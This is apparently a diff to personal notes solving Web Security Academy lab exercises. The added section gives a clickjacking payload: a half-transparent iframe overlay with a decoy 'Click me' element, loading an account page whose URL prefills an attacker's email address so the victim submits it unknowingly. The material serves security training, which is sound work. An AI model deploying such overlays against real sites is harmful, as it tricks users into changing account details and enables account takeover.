@@ -27,3 +27,29 @@ Basic clickjacking with CSRF token protection
 <div>Click me</div>
 <iframe src="https://0ad4006d03ec7624839c15e900710088.web-security-academy.net/my-account"></iframe>
 
+===
+
+Clickjacking with form input data prefilled from a URL parameter
+
+// same template as before, but this time with param in URL
+// this allows us to submit a form with the required params
+// as the user
+<style>
+  iframe {
+    position:relative;
+    width:500px;
+    height: 700px;
+    opacity: 0.5;
+    z-index: 2;
+  }
+  div {
+    position:absolute;
+    top:445px;
+    left:70px;
+    z-index: 1;
+  }
+</style>
+<div>Click me</div>
+<iframe src="https://0a7600fc04e09d0b80cb26dc005d00a9.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
+
+
